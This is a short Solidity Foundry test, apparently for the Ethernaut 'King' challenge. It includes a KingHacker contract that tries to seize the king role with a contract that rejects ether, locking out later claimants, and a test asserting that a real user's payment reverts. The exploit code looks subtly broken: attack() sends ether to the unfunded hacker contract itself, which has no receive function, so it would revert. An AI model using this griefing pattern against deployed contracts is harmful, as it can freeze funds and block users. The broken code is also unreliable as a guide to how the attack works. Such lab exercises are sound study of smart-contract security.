// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

import {Test, console} from "../lib/forge-std/src/Test.sol";

import {King} from "../src/King.sol";

contract KingTest is Test {
    King target;
    KingHacker hackTarget;

    function setUp() public {
        target = new King{value: 1 ether}();
        hackTarget = new KingHacker(address(target));
    }

    function test_KingToReceiveEther() public {
        hackTarget.attack();
        assert(target._king() == address(hackTarget));
        uint256 prize = target.prize();

        address user = makeAddr("real user");
        deal(user, prize);
        vm.prank(user);
        vm.expectRevert();
        payable(address(target)).transfer(prize);
    }
}

contract KingHacker {
    King target;
    constructor(address _target) {
        target = King(payable(_target));
    }

    function attack() public payable {
        uint256 prize = target.prize();
        payable(address(this)).transfer(prize);
        payable(address(target)).transfer(prize);
    }
}
